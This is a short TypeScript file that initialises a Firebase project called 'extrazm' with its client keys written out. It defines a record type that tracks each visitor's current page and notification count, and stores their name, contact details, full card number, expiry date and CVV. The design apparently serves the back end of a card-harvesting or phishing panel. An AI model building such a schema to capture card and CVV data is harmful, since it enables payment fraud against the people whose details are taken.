import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDx7jRudItQzl435lTkrETc9tGCiLtKmLM",
  authDomain: "extrazm.firebaseapp.com",
  databaseURL: "https://extrazm-default-rtdb.firebaseio.com",
  projectId: "extrazm",
  storageBucket: "extrazm.firebasestorage.app",
  messagingSenderId: "560730624706",
  appId: "1:560730624706:web:2a4892077eff380162a15b"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
